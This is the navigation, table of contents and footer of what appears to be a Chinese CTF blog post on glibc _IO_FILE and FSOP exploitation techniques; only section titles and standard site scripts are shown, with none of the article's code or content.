src="/img/bck.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-17</div><div class="title">top chunk的一种利用</div></div></a></div><div><a href="/2021/11/01/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95/" title="倒叙输出flag"><img class="cover" src="/img/bck.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-01</div><div class="title">倒叙输出flag</div></div></a></div><div><a href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF%E9%83%A8%E5%88%86PWN/" title="东华杯部分PWN"><img class="cover" src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-01</div><div class="title">东华杯部分PWN</div></div></a></div><div><a href="/2021/11/14/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B/" title="近期比赛记录"><img class="cover" src="/img/bck.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-14</div><div class="title">近期比赛记录</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">_IO_FILE结构体利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE-file%E7%BB%93%E6%9E%84%E5%A6%82%E4%B8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">IO_FILE file结构如下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vtable%E7%BB%93%E6%9E%84%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">vtable结构如下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E5%88%A9%E7%94%A8-IO-FILE%E7%9A%84%E6%96%B9%E5%BC%8F-2-23%E7%89%88%E6%9C%AC%E4%B8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">两种利用_IO_FILE的方式(2.23版本下)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E5%AF%B9vtable%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8-%E4%B8%A4%E7%A7%8D%E5%8A%AB%E6%8C%81%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">首先是对vtable进行利用(两种劫持方法)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">第二种</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP-2-23%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">FSOP(2.23版本)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.0.1.</span> <span class="toc-text">利用模板</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x64%E4%BD%8D"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">x64位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x32%E4%BD%8D"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">x32位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8Bseccomp%E7%A6%81%E7%94%A8execve%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E6%9E%84%E9%80%A0%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">64位下seccomp禁用execve系统调用的构造模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahouseoforange-hitcon-2016"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">例题：houseoforange-hitcon-2016</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP-2-24%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">FSOP(2.24版本)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-23-2-24%E6%80%BB%E7%BB%93%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">2.23-2.24总结利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-31%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84IO-FILE%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">2.31版本下的IO_FILE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-32%E4%B8%8B%E7%9A%84io-str-overflow"><span class="toc-number">4.0.1.</span> <span class="toc-text">2.32下的io_str_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%932-31IO%E5%88%A9%E7%94%A8%E5%A6%82%E4%B8%8B"><span class="toc-number">4.0.2.</span> <span class="toc-text">个人总结2.31IO利用如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B"><span class="toc-number">4.0.3.</span> <span class="toc-text">pwnhub公开赛一道题目为例</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By LOLOLO</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="Go,Study,Think" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>